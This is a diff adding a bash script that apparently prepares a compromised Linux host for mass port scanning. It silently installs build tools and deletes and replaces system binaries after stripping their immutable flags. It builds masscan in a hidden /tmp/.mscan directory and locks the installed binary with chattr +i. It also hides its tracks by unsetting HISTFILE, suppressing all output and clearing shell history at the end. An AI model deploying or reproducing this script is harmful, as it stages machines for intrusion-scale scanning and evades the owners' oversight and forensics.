@@ -1,0 +1,45 @@
+#!/bin/bash
+unset HISTFILE
+export HOME=/root
+export LC_ALL=C
+export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
+
+if ! type curl 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y curl 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null ; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y curl 2>/dev/null 1>/dev/null ; yum reinstall -y curl 2>/dev/null 1>/dev/null ; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add curl 2>/dev/null 1>/dev/null ; fi ; fi
+if ! type bash 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bash 2>/dev/null 1>/dev/null; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi ; fi
+if ! type gcc 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y gcc 2>/dev/null 1>/dev/null; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y gcc 2>/dev/null 1>/dev/null; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add gcc 2>/dev/null 1>/dev/null; fi ; fi
+if ! type make 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y make 2>/dev/null 1>/dev/null; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y make 2>/dev/null 1>/dev/null; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add make 2>/dev/null 1>/dev/null; fi ; fi
+if ! type git 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y git 2>/dev/null 1>/dev/null; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y git 2>/dev/null 1>/dev/null; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add git 2>/dev/null 1>/dev/null; fi ; fi
+if ! type go 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y golang 2>/dev/null 1>/dev/null; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y golang 2>/dev/null 1>/dev/null; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add go 2>/dev/null 1>/dev/null; fi ; fi
+
+
+function give_me(){
+SETUP_IT=$1
+BINARY=`command -v $SETUP_IT`
+if ! [ -z "$BINARY" ] ; then chattr -ia $BINARY 2>/dev/null ; chmod 1777 $BINARY 2>/dev/null ; rm -f $BINARY 2>/dev/null ; fi
+if ! type $SETUP_IT 2>/dev/null 1>/dev/null; then 
+if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y $SETUP_IT 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall $SETUP_IT 2>/dev/null 1>/dev/null ; fi
+if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y $SETUP_IT 2>/dev/null 1>/dev/null ; yum reinstall -y $SETUP_IT 2>/dev/null 1>/dev/null ; fi
+if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add $SETUP_IT 2>/dev/null 1>/dev/null ; fi
+fi
+}
+
+if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y libpcap-dev 2>/dev/null 1>/dev/null; fi
+if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y libpcap-devel 2>/dev/null 1>/dev/null; fi
+if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add libpcap-dev 2>/dev/null 1>/dev/null; fi
+give_me git
+give_me gcc
+give_me make
+
+chattr -ia / /tmp/
+git clone https://github.com/robertdavidgraham/masscan /tmp/.mscan/
+cd /tmp/.mscan/
+make
+cp ./bin/masscan /usr/bin/masscan
+chmod +x /usr/bin/masscan
+chattr +i /usr/bin/masscan
+make install
+
+cd /
+rm -fr /tmp/.mscan/
+
+history -c
